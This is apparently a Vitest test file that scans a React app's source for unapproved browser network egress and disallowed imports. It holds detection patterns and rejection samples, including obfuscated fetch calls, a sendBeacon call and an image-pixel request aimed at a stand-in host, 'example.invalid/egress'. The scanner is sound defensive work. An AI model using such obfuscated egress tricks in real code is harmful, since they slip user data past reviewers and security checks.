import { describe, expect, it } from "vitest";

const productSources = import.meta.glob<string>(["./**/*.ts", "./**/*.tsx", "./**/*.css"], {
  eager: true,
  import: "default",
  query: "?raw",
});

const formatSources = import.meta.glob<string>(["./**/*.{ts,tsx}", "../*.{html,json,md,ts}"], {
  eager: true,
  import: "default",
  query: "?raw",
});

const transportPath = "./platform/api/mvp-api-client.ts";
const allowedFetchTargets = [
  "/api/mvp/bootstrap?persona=reporter",
  "/api/mvp/bootstrap?persona=engineer",
  "/api/mvp/commands",
] as const;
const explicitTestSetupPath = "./test/setup.ts";
const actualTestFileSuffix = /\.(?:test|spec)\.(?:ts|tsx)$/;
const approvedIconProps = 'const common = { fill: "none", stroke: "currentColor", strokeLinecap: "round" as const, strokeLinejoin: "round" as const, strokeWidth: 1.8 };';

function isProductionSourcePath(path: string): boolean {
  const normalizedPath = path.replaceAll("\\", "/");
  const basename = normalizedPath.slice(normalizedPath.lastIndexOf("/") + 1);
  return normalizedPath !== explicitTestSetupPath && !actualTestFileSuffix.test(basename);
}

function normalizeEscapedIdentifiers(source: string): string {
  const decode = (match: string, hexadecimal: string) => {
    const codePoint = Number.parseInt(hexadecimal, 16);
    return codePoint <= 0x10ffff ? String.fromCodePoint(codePoint) : match;
  };
  let normalized = source
    .replace(/\\u\{([0-9a-f]{1,6})\}/gi, decode)
    .replace(/\\u([0-9a-f]{4})/gi, decode)
    .replace(/\\x([0-9a-f]{2})/gi, decode);
  while (true) {
    const folded = normalized.replace(/(["'`])([^"'`\\\r\n$]*)\1\s*\+\s*(["'`])([^"'`\\\r\n$]*)\3/g, (_match, quote: string, left: string, _rightQuote: string, right: string) => `${quote}${left}${right}${quote}`);
    if (folded === normalized) return normalized;
    normalized = folded;
  }
}

function jsxOpeningTags(source: string): { name: string; attributes: string }[] {
  const tags: { name: string; attributes: string }[] = [];
  for (const match of source.matchAll(/<\s*([A-Za-z][\w$.:-]*)\s+/g)) {
    const start = match.index + match[0].length;
    let quote = "";
    let braces = 0;
    for (let index = start; index < source.length; index += 1) {
      const character = source[index];
      if (quote) {
        if (character === "\\") index += 1;
        else if (character === quote) quote = "";
      } else if (character === '"' || character === "'" || character === "`") {
        quote = character;
      } else if (character === "{") {
        braces += 1;
      } else if (character === "}") {
        braces -= 1;
      } else if (character === ">" && braces === 0) {
        tags.push({ name: match[1], attributes: source.slice(start, index) });
        break;
      }
    }
  }
  return tags;
}

function inspectStylesheetSource(source: string): string[] {
  const normalized = source
    .replace(/\\(?:\r\n|[\n\r\f])/g, "")
    .replace(/\\([0-9a-f]{1,6})(?:\r\n|[\t\n\r\f ])?|\\([^0-9a-f])/gi, (_match, hexadecimal: string | undefined, escaped: string | undefined) => {
      if (hexadecimal === undefined) return escaped ?? "";
      const codePoint = Number.parseInt(hexadecimal, 16);
      return codePoint > 0 && codePoint <= 0x10ffff ? String.fromCodePoint(codePoint) : "\ufffd";
    })
    .replace(/\/\*[\s\S]*?\*\//g, "");
  return /@import\b|\b(?:url|(?:-webkit-)?image-set|src)\s*\(/i.test(normalized)
    ? ["disallowed stylesheet resource"] : [];
}

function inspectNetworkSource(path: string, source: string) {
  const inspectedSource = normalizeEscapedIdentifiers(source);
  const violations: string[] = inspectStylesheetSource(inspectedSource);
  const directCalls: { index: number; target: string }[] = [];
  const directFetch = /(?<![\w$.])\bfetch\s*\(\s*(["'])([^"'\\\r\n]*)\1\s*,/g;
  for (const match of inspectedSource.matchAll(directFetch)) {
    const target = match[2];
    directCalls.push({ index: match.index, target });
    if (path !== transportPath || !allowedFetchTargets.includes(target as (typeof allowedFetchTargets)[number])) {
      violations.push(`disallowed fetch target: ${target}`);
    }
  }
  for (const match of inspectedSource.matchAll(/\bfetch\b/g)) {
    if (!directCalls.some((call) => call.index === match.index)) violations.push("non-literal or indirect fetch");
  }
  if (/https?:\/\/|["']\/\//i.test(inspectedSource)) violations.push("absolute or protocol-relative target");
  for (const match of inspectedSource.matchAll(/\b(XMLHttpRequest|WebSocket|WebTransport|EventSource|sendBeacon|Worker|SharedWorker|importScripts|Audio|Image)\b/g)) violations.push(`disallowed transport: ${match[1]}`);
  const allowedConstructors = new Set(["AbortController", "Error", "Promise", "Set", "TextDecoder", "Uint8Array", "URLSearchParams", "WeakSet"]);
  for (const match of inspectedSource.matchAll(/\bnew\s+([A-Za-z_$][\w$]*)\b/g)) {
    if (!allowedConstructors.has(match[1])) violations.push(`disallowed constructor: ${match[1]}`);
  }
  const allowedGlobalReferences = [
    /\bglobalThis\.KeyboardEvent\b/g,
    /\b(?:globalThis|window)\.setTimeout\s*\(\s*\(\)\s*=>/g,
    /\b(?:globalThis|window)\.clearTimeout\s*\(/g,
    /\bwindow\.(?:addEventListener|removeEventListener)\b/g,
    /\bwindow\.location\.search\b/g,
    /\bdocument\.(?:getElementById|querySelectorAll)\b/g,
  ].flatMap((pattern) => [...inspectedSource.matchAll(pattern)].map((match) => ({ start: match.index, end: match.index + match[0].length })));
  for (const match of inspectedSource.matchAll(/\b(globalThis|window|document|navigator|self|frames|top|parent)\b/g)) {
    if (!allowedGlobalReferences.some((reference) => match.index >= reference.start && match.index < reference.end)) {
      violations.push(`disallowed browser-global access: ${match[1]}`);
    }
  }
  for (const match of inspectedSource.matchAll(/\b(setTimeout|clearTimeout)\b/g)) {
    if (!allowedGlobalReferences.some((reference) => match.index >= reference.start && match.index < reference.end)) {
      violations.push(`disallowed timer access: ${match[1]}`);
    }
  }
  const browserEgressPatterns: readonly [RegExp, string][] = [
    // Styles belong in scanned CSS files; dynamic inline CSS is not statically inspectable.
    [/\b(?:style|cssText)\b/g, "inline style"],
    // Product elements must use the inspected JSX path, including when props or tag names are dynamic.
    [/\b(?:createElement|cloneElement|jsx|jsxs|jsxDEV)\b/g, "uninspected element factory"],
    [/\b(?:src|srcSet|href|xlinkHref|poster|srcDoc|formAction)\b["']?\s*(?:[:=]|\])/gi, "resource prop"],
    [/\b(?:globalThis|window|navigator|document)\s*\[/g, "computed browser-global access"],
    [/\bReflect\s*\./g, "reflective browser access"],
    [/\.\s*constructor\s*\(/g, "dynamic constructor access"],
    [/\.(?:ownerDocument|defaultView|contentWindow|contentDocument)\b/g, "derived browser-global access"],
    [/\bnew\s+Image\s*\(/g, "image request"],
    [/<\s*(?:a|audio|embed|form|iframe|image|img|link|object|script|source|track|use|video)\s+(?=[A-Za-z_:{])/gi, "resource-bearing markup"],
    [/\bdocument\.createElement\s*\(\s*["'](?:a|audio|embed|form|iframe|image|img|link|object|script|source|track|video)["']\s*\)/gi, "resource-bearing element"],
    [/(?:\.|\]\s*)(?:src|href|action|data|poster|srcdoc)\s*=/g, "resource target assignment"],
    [/\bsetAttribute\s*\(\s*["'](?:src|href|action|data|poster|srcdoc)["']\s*,/g, "resource target attribute"],
    [/\burl\s*\(/gi, "CSS resource target"],
    [/(?<![\w$-])open(?![\w$-])/g, "window navigation"],
    [/\b(?:window\.)?location\.(?:assign|replace)\s*\(/g, "location navigation"],
    [/\b(?:window\.)?location(?:\.href)?\s*=/g, "location assignment"],
    [/\b(?:requestSubmit|submit)\s*\(/g, "form submission"],
  ];
  for (const [pattern, label] of browserEgressPatterns) {
    if (pattern.test(inspectedSource)) violations.push(`disallowed browser egress: ${label}`);
  }
  const fixedIconProps = path === "./App.tsx" && inspectedSource.includes(approvedIconProps)
    && !/\bcommon\b/.test(inspectedSource.replace(approvedIconProps, "").replaceAll("{...common}", ""));
  for (const tag of jsxOpeningTags(inspectedSource)) {
    if (/\b(?:action|data)\s*=/.test(tag.attributes)) violations.push("disallowed browser egress: resource JSX prop");
    // Preserve only the existing literal icon props, with no other reference that could mutate or shadow them.
    const attributes = fixedIconProps && /^(?:path|rect|circle)$/.test(tag.name)
      ? tag.attributes.replaceAll("{...common}", "") : tag.attributes;
    if (/\{\s*\.\.\./.test(attributes)) {
      violations.push("disallowed browser egress: uninspected JSX spread");
    }
  }
  return { targets: directCalls.map((call) => call.target), violations };
}

describe("browser-source boundary", () => {
  const productionSources = Object.entries(productSources).filter(([path]) => isProductionSourcePath(path));
  const sourceText = productionSources.filter(([path]) => !path.endsWith(".css")).map(([, content]) => content).join("\n");

  it("includes an embedded test token helper in production scans", () => {
    const path = "./capabilities/tickets/ticket.test.helpers.ts";
    expect(isProductionSourcePath(path)).toBe(true);
    expect(inspectNetworkSource(path, 'fetch("/api/mvp/commands", {});').violations).toContain("disallowed fetch target: /api/mvp/commands");
  });

  it.each([
    "./App.test.tsx",
    "./features/card-runtime.test.ts",
    "./features/card-runtime.test.tsx",
    "./features/card-runtime.spec.ts",
    "./features/card-runtime.spec.tsx",
    "./test/setup.ts",
    ".\\App.test.tsx",
    ".\\features\\card-runtime.spec.ts",
    ".\\test\\setup.ts",
  ])("excludes only an actual test or explicit setup: %s", (path) => {
    expect(isProductionSourcePath(path)).toBe(false);
  });

  it.each([
    "./capabilities/tickets/ticket.test.helpers.ts",
    "./features/card.spec.adapter.ts",
    "./features/card.test-helper.ts",
    "./features/card.testing.ts",
    "./test/setup.helpers.ts",
    "./test/runtime.ts",
    ".\\capabilities\\tickets\\ticket.test.helpers.ts",
    "./tests/runtime.ts",
    "./spec/runtime.ts",
    "./__tests__/runtime.ts",
    "./features.test.ts/runtime.ts",
    "./features.spec.ts/runtime.ts",
    "./features/card.Test.ts",
    "./features/card.SPEC.ts",
    "./features/card.test.TSX",
    "./features/cardxtest.ts",
    "./features/test/setup.ts",
  ])("includes a production-importable module: %s", (path) => {
    expect(isProductionSourcePath(path)).toBe(true);
  });

  it("retains embedded test-token content for both per-file and aggregate production scans", () => {
    const helperPath = "./capabilities/tickets/ticket.test.helpers.ts";
    const helperSource = 'fetch("/api/mvp/commands", {}); localStorage; /* node:fs marker */';
    const entries = [
      [helperPath, helperSource],
      ["./capabilities/tickets/ticket.test.ts", "excluded-test-sentinel"],
      ["./test/setup.ts", "excluded-setup-sentinel"],
    ];
    const selected = entries.filter(([path]) => isProductionSourcePath(path));
    expect(selected).toEqual([[helperPath, helperSource]]);
    for (const [path, content] of selected) {
      expect(inspectNetworkSource(path, content).violations).toContain("disallowed fetch target: /api/mvp/commands");
    }
    const selectedText = selected.map(([, content]) => content).join("\n");
    for (const marker of ["fetch", "localStorage", "node:fs"]) expect(selectedText).toContain(marker);
  });

  it("confines browser requests to the exact app-local transport targets", () => {
    for (const [path, content] of productionSources) {
      expect(path.endsWith(".css") ? inspectStylesheetSource(content) : inspectNetworkSource(path, content).violations, path).toEqual([]);
    }
    expect(inspectNetworkSource(transportPath, productSources[transportPath]).targets).toEqual(allowedFetchTargets);
  });

  it("keeps App, Ticket capabilities and generic features free from fetch", () => {
    for (const [path, content] of productionSources.filter(([path]) => path === "./App.tsx" || path.startsWith("./capabilities/tickets/") || path.startsWith("./features/"))) {
      expect(content, path).not.toMatch(/\bfetch\b/);
    }
  });

  it("includes the imported production stylesheets", () => {
    expect(productionSources.map(([path]) => path)).toEqual(expect.arrayContaining([
      "./styles.css",
      "./capabilities/tickets/ticket.css",
    ]));
    for (const [path, content] of productionSources.filter(([path]) => path.endsWith(".css"))) {
      expect(content.length, path).toBeGreaterThan(0);
    }
  });

  it.each([
    'body { background: url("/api/mvp/other"); }',
    '@import "/api/mvp/other";',
    '@import url("/api/mvp/other");',
    'body { background: image-set("/api/mvp/other" 1x); }',
    'body { background: -webkit-image-set("/api/mvp/other" 1x); }',
    'body { background: u\\72l("/api/mvp/other"); }',
    'body { background: \\75 rl("/api/mvp/other"); }',
    '@\\69mport "/api/mvp/other";',
    '@import/**/"/api/mvp/other";',
    'body { background: src("/api/mvp/other"); }',
  ])("rejects stylesheet egress: %s", (source) => {
    expect(inspectStylesheetSource(source)).toEqual(["disallowed stylesheet resource"]);
  });

  it("retains ordinary CSS with local gradients and variables", () => {
    expect(inspectStylesheetSource(".card { color: var(--text); background: linear-gradient(red, blue); }")).toEqual([]);
  });

  it.each([
    `<style>{'@import "/api/mvp/other";'}</style>`,
    `<div style={{ backgroundImage: 'image-set("/api/mvp/other" 1x)' }} />`,
    `<div style={{ backgroundImage: '-webkit-image-set("/api/mvp/other" 1x)' }} />`,
    `<div style={{ backgroundImage: 'src("/api/mvp/other")' }} />`,
    `<style>{'@im' + 'port "/api/mvp/other";'}</style>`,
    `<div style={{ backgroundImage: 'image-' + 'set("/api/mvp/other" 1x)' }} />`,
    'const image = "u" /* split */ + "rl(/api/mvp/other)"; <div style={{ backgroundImage: image }} />;',
    'const image = "u" + /* split */ "rl(/api/mvp/other)"; <div style={{ backgroundImage: image }} />;',
    'const image = "u" // split\n + "rl(/api/mvp/other)"; <div style={{ backgroundImage: image }} />;',
    'const image = "image-" + // split\n "set(/api/mvp/other 1x)"; <div style={{ backgroundImage: image }} />;',
    'const image = ("u") + ("rl(/api/mvp/other)"); <div style={{ backgroundImage: image }} />;',
    '<div style={unknownStyle} />;',
    'const props = { style: unknownStyle }; <div {...props} />;',
    'const props = { ["st" /* split */ + "yle"]: { backgroundImage: ("u") + ("rl(/api/mvp/other)") } }; <div {...props} />;',
    String.raw`<style>{'@\\69mport "/api/mvp/other";'}</style>`,
    'open("/api/mvp/other");',
    'const navigate = open; navigate("/api/mvp/other");',
    '(0, open)("/api/mvp/other");',
    'open.call(null, "/api/mvp/other");',
    'const navigate = open.bind(null); navigate("/api/mvp/other");',
  ])("rejects inline styles and unqualified navigation: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it("keeps presentation in scanned stylesheets", () => {
    expect(inspectNetworkSource("./Component.tsx", 'import "./styles.css"; <div className="card" />;').violations).toEqual([]);
  });

  it("allows only the existing immutable icon spread", () => {
    const source = `${approvedIconProps} <path {...common} d="M0 0" />;`;
    expect(inspectNetworkSource("./App.tsx", source).violations).toEqual([]);
    for (const candidate of [
      source.replace("<path", "<div"),
      `${source} common.stroke = value;`,
      `${source} mutate(common);`,
      `${source} function nested(common: unknown) { return <path {...common} />; }`,
      source.replace("strokeWidth: 1.8", "strokeWidth: dynamicValue"),
    ]) expect(inspectNetworkSource("./App.tsx", candidate).violations.length).toBeGreaterThan(0);
    expect(inspectNetworkSource("./Other.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it.each(allowedFetchTargets)("admits the fixed relative literal transport target %s", (target) => {
    expect(inspectNetworkSource(transportPath, `fetch("${target}", {});`).violations).toEqual([]);
  });

  it.each([
    ["direct Ticket fetch", "./capabilities/tickets/ticket-runtime.ts", 'fetch("/api/mvp/commands", {});'],
    ["direct App fetch", "./App.tsx", 'fetch("/api/mvp/commands", {});'],
    ["feature fetch", "./features/cards/card-runtime.ts", 'fetch("/api/mvp/commands", {});'],
    ["absolute URL", transportPath, 'fetch("https://example.invalid/api/mvp/commands", {});'],
    ["protocol-relative URL", transportPath, 'fetch("//example.invalid/api/mvp/commands", {});'],
    ["arbitrary endpoint variable", transportPath, "fetch(endpoint, {});"],
    ["aliased fetch", transportPath, 'const request = fetch; request("/api/mvp/commands", {});'],
    ["indirect fetch helper", transportPath, 'invoke(fetch, "/api/mvp/commands");'],
    ["globalThis.fetch", transportPath, 'globalThis.fetch("/api/mvp/commands", {});'],
    ["window.fetch", transportPath, 'window.fetch("/api/mvp/commands", {});'],
    ["escaped computed fetch", transportPath, 'globalThis["\\x66etch"]("https://example.invalid/egress", {});'],
    ["computed fetch fragments", transportPath, 'globalThis["fe" + "tch"]("https://example.invalid/egress", {});'],
    ["template-literal fetch fragments", transportPath, "globalThis[`fe` + `tch`](`/api/mvp/other`, {});"],
    ["aliased global with computed fetch", transportPath, 'const root = globalThis; const request = root["fe" + "tch"]; request("https" + "://example.invalid/egress");'],
    ["derived global with computed fetch", transportPath, 'const root = document.getElementById("root")?.ownerDocument.defaultView; root?.["fe" + "tch"]("/api/mvp/other");'],
    ["XMLHttpRequest", transportPath, "new XMLHttpRequest();"],
    ["WebSocket", transportPath, 'new WebSocket("/api/mvp/commands");'],
    ["EventSource", transportPath, 'new EventSource("/api/mvp/commands");'],
    ["sendBeacon", transportPath, 'navigator.sendBeacon("https://example.invalid/egress", "demo");'],
    ["WebTransport", transportPath, 'new WebTransport("https:" + "//example.invalid/egress");'],
    ["Audio constructor", transportPath, 'new Audio("https:" + "//example.invalid/egress");'],
    ["Image source", transportPath, 'const pixel = new Image(); pixel.src = "https://example.invalid/egress";'],
    ["resource markup", transportPath, '<img src="https://example.invalid/egress" />;'],
    ["object data", transportPath, '<object data={"https:" + "//example.invalid/egress"} />;'],
    ["embed source", transportPath, '<embed src={"https:" + "//example.invalid/egress"} />;'],
    ["form submission", transportPath, '<form action="https://example.invalid/egress" />;'],
    ["string timer code", transportPath, 'globalThis.setTimeout(\'this["fe" + "tch"]("https:" + "//example.invalid/egress")\', 0);'],
  ])("rejects %s", (_label, path, source) => {
    expect(inspectNetworkSource(path, source).violations.length).toBeGreaterThan(0);
  });

  it("rejects a fourth fetch target", () => {
    const candidate = `${allowedFetchTargets.map((target) => `fetch("${target}", {});`).join("\n")}\nfetch("/api/mvp/other", {});`;
    const result = inspectNetworkSource(transportPath, candidate);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.targets).toHaveLength(4);
  });

  it.each(["a", "audio", "embed", "form", "iframe", "image", "img", "link", "object", "script", "source", "track", "use", "video"])("rejects resource props spread onto %s", (tag) => {
    for (const source of [
      `const props = { src: "/api/mvp/other" }; <${tag} {...props} />;`,
      `<${tag}\n  {...{ src: "/api/mvp/other" }} />;`,
      `<${tag} {...props} src="/api/mvp/other" />;`,
      `<${tag} {...props}></${tag}>;`,
    ]) {
      expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: resource-bearing markup");
    }
  });

  it.each([
    "const errors = new WeakSet<object>();",
    "<div className={className} />;",
    "<TicketCard title={title} />;",
  ])("retains non-resource syntax: %s", (source) => {
    expect(inspectNetworkSource("./Component.tsx", source).violations).toEqual([]);
  });

  it.each([
    'React.createElement("img", { src: "/api/mvp/other" });',
    'createElement("img", props);',
    'import { createElement as render } from "react"; render("img", props);',
    'const render = React.createElement; render("img", props);',
    'React["create" + "Element"]("img", props);',
    'React.cloneElement(element, { src: "/api/mvp/other" });',
    'import { jsx as render } from "react/jsx-runtime"; render("img", props);',
    'import { jsxs as render } from "react/jsx-runtime"; render("video", props);',
    'import { jsxDEV as render } from "react/jsx-dev-runtime"; render("img", props);',
  ])("rejects uninspected element factories: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: uninspected element factory");
  });

  it.each([
    'const Tag = "img"; <Tag src="/api/mvp/other" />;',
    'const Tag = "img"; <Tag onLoad={() => {}} src={target} />;',
    'const Tag = "img"; const props = { src: "/api/mvp/other" }; <Tag {...props} />;',
    'const Tag = "img"; <Tag {...props} />;',
    'const Tag = "img"; <Tag onLoad={() => {}} {...props} />;',
    'const tags = { Image: "img" }; <tags.Image {...props} />;',
    'const Tag = "a"; <Tag href="/api/mvp/other" />;',
    'const Tag = "form"; <Tag action="/api/mvp/other" />;',
    'const Tag = "form"; <Tag onSubmit={() => {}} action="/api/mvp/other" />;',
    'const Tag = "object"; <Tag data="/api/mvp/other" />;',
    'const Tag = "object"; <Tag title=">" data="/api/mvp/other" />;',
    'const Tag = "form"; <Tag title=">" action="/api/mvp/other" />;',
    'const Tag = "img"; <Tag title=">" {...props} />;',
    'const Tag = "object"; <Tag hidden={count > 0} data="/api/mvp/other" />;',
    'const Tag = "img"; <Tag hidden={count > 0} {...props} />;',
    '<input type="image" src="/api/mvp/other" />;',
    '<button formAction="/api/mvp/other" />;',
    'const props = { "src": target };',
    'const props = { ["src" + "Set"]: target };',
  ])("rejects resource props independent of the JSX tag: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it("keeps browser code free from persistence, unsafe HTML, and native runtime access", () => {
    expect(sourceText).not.toMatch(/\b(localStorage|sessionStorage|indexedDB|serviceWorker)\b/);
    expect(sourceText).not.toMatch(/dangerouslySetInnerHTML|innerHTML|eval\s*\(|new Function/);
    expect(sourceText).not.toMatch(/@tauri-apps|node:|fastify|@prisma\/client|\b(prisma|redis|pg)\b/);
    expect(sourceText).not.toMatch(/\bimport\s*\(|javascript:|https?:\/\/|<iframe|document\.write/);
    expect(sourceText).not.toMatch(/FileReader|FormData|Blob|URL\.createObjectURL|<input[^>]*\btype\s*=\s*["']file|file:\/\/|blob:|data:image/);
    expect(sourceText).not.toMatch(/componentName|executable|callbackFunction/);
    expect(sourceText).not.toMatch(/Math\.random|Date\.now|new Date\s*\(|crypto\.|setInterval\s*\(/);
    const builtins = new Set(["_http_agent", "_http_client", "_http_common", "_http_incoming", "_http_outgoing", "_http_server", "_stream_duplex", "_stream_passthrough", "_stream_readable", "_stream_transform", "_stream_wrap", "_stream_writable", "_tls_common", "_tls_wrap", "assert", "assert/strict", "async_hooks", "buffer", "child_process", "cluster", "console", "constants", "crypto", "dgram", "diagnostics_channel", "dns", "dns/promises", "domain", "events", "fs", "fs/promises", "http", "http2", "https", "inspector", "inspector/promises", "module", "net", "os", "path", "path/posix", "path/win32", "perf_hooks", "process", "punycode", "querystring", "readline", "readline/promises", "repl", "sea", "sqlite", "stream", "stream/consumers", "stream/promises", "stream/web", "string_decoder", "sys", "test", "test/reporters", "timers", "timers/promises", "tls", "trace_events", "tty", "url", "util", "util/types", "v8", "vm", "wasi", "worker_threads", "zlib"]);
    for (const match of sourceText.matchAll(/(?:\bfrom\s*|\bimport\s*|\brequire\s*\(\s*)["']([^"']+)["']/g)) {
      expect(builtins.has(match[1]), `browser import: ${match[1]}`).toBe(false);
    }
    expect(Object.keys(productSources).some((path) => path.includes("/capabilities/tickets/") && isProductionSourcePath(path))).toBe(true);
  });

  it("uses source formatting with final newlines, no carriage returns, and no trailing whitespace", () => {
    for (const [path, content] of Object.entries(formatSources)) {
      expect(content, path).toMatch(/\n$/);
      expect(content, path).not.toContain("\r");
      expect(content, path).not.toMatch(/[ \t]+$/m);
    }
  });
});
